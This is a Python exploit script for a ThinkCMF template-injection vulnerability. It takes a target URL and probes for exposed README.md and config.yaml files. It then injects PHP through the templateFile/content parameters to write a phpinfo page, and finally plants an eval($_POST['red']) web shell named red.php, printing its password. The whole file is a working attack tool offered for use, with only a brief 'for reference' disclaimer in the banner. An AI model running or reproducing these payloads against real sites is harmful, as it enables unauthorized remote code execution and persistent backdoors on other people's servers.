# Author: zjun
# Github: https://github.com/bestreder
# Date: 2020-02-10

import requests
import argparse
from requests.exceptions import RequestException

headers = {
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'
}

def payload_01(url):
	try:
		response = requests.get((url+'?a=display&templateFile=README.md'), headers = headers, timeout = 5)
		if '## README' in response.text:
			print ('[+]存在readme.md: {}?a=display&templateFile=README.md'.format(url))
			return 0
		return 1
	except RequestException:
		return 2

def payload_02(url):
	try:
		response = requests.get((url+'?a=display&templateFile=config.yaml'), headers = headers, timeout = 5)
		if 'name: thinkcmf' in response.text:
			print('[+]存在config.yaml: {}?a=display&templateFile=config.yaml'.format(url))
			return 0
		return 1
	except RequestException:
		return 2

def payload_03(url):
	try:
		response = requests.get((url+"?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo();?>')</php>"), headers = headers, timeout = 5)
		if response.status_code == 200:
			response = requests.get((url+'/test.php'), headers = headers, timeout = 5)
			if response.status_code == 200:
				if 'http://www.php.net' in response.text:
					print('[+]phpinfo: {}/test.php'.format(url))
					return 0
				return 1
			return 1
		return 1
	except RequestException:
		return 2

def payload_04(url):
	try:
		response = requests.get((url+'''?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('red.php','<?php eval($_POST["red"]);?>')</php>'''), headers = headers,allow_redirects=False, timeout = 5)
		if response.status_code == 200:
			response = requests.get((url+'/red.php'), headers = headers,allow_redirects=False, timeout = 5)
			if response.status_code == 200:
				print('[+]请连接shell,密码是red: {}/red.php'.format(url))
				return 0
			return 1
		return 1
	except RequestException:
		return 2

if __name__ == '__main__':
	print(r'''
 _   _     _       _                   __
| |_| |__ (_)_ __ | | _____ _ __ ___  / _|       _____  ___ __
| __| '_ \| | '_ \| |/ / __| '_ ` _ \| |_ _____ / _ \ \/ / '_ \
| |_| | | | | | | |   < (__| | | | | |  _|_____|  __/>  <| |_) |
 \__|_| |_|_|_| |_|_|\_\___|_| |_| |_|_|        \___/_/\_\ .__/
                                                         |_|
                                         -by:zjun
                                        www.zjun.info
该脚本具有一定误差,请谨慎使用,仅供参考!
		''')
	parser = argparse.ArgumentParser(description='The exp of thinkcmf')
	parser.add_argument('-u', '--url',required=True,help='target url')
	args = parser.parse_args()
	url = args.url
	payload_01 = payload_01(url)
	payload_02 = payload_02(url)
	payload_03 = payload_03(url)
	payload_04 = payload_04(url)
	if payload_01 and payload_02 and payload_03 and payload_04 == 2:
		print('[-]连接超时:{}'.format(url))
	elif payload_01 and payload_02 and payload_03 and payload_04 == 1:
		print('[-]初步测试暂不存在thinkcmf漏洞: {}'.format(url))
	else:
		print('^ _ ^ enjoy it!')
